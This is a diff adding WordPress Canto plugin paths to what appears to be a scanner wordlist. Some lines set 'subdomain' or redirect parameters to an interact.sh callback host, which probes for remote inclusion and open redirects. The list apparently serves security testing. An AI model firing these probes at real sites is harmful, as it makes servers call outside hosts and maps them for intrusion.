@@ -235,3 +235,6 @@
 /homeautomation_v3_3_2/api.php?do=groups/toggle&groupid=1&status=1&redirect=https://interact.sh/
 /webadmin/authportal/bounce.php?url=https://interact.sh/
 /zabbix/zabbix.php?action=dashboard.list
+/wp-content/plugins/canto/includes/lib/detail.php?subdomain={{interactsh-url}}?
+/wp-content/plugins/canto/includes/lib/get.php?subdomain={{interactsh-url}}?
+/wp-content/plugins/canto/includes/lib/tree.php?subdomain={{interactsh-url}}?
